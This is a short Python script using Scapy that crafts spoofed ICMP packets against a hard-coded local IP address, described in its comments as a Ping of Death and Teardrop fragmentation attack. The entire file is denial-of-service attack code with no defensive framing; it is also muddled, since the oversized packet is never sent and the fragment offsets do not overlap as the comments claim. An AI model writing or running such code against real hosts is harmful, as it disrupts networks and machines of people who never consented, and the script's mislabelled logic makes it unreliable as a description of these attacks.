from scapy.all import *

target_ip = "192.168.1.59"  # target machine IP
spoofed_ip = "192.168.1.59"  # target machine IP

#Ping of Death payload (oversized ICMP packet)
payload = "A" * 65535

# Craft the Ping of Death packet
ping_of_death_packet = IP(src=spoofed_ip, dst=target_ip) / ICMP() / payload

offset = 0

# Generate 8 ICMP Teardrop packets with overlapping offsets
for i in range(8):
	frag_size = 8  # Fragment size
	frag_payload = payload[offset * frag_size: (offset + 1) * frag_size]
	frag_packet = IP(src=spoofed_ip, dst=target_ip, id=12345, frag=offset, flags="MF") / ICMP() / frag_payload
	send(frag_packet)
	offset += 1

# Send the last fragment with the "MF" flag unset
last_frag_payload = payload[offset * frag_size:]
last_frag_packet = IP(src=spoofed_ip, dst=target_ip, id=12345, frag=offset) / ICMP() / last_frag_payload
send(last_frag_packet)
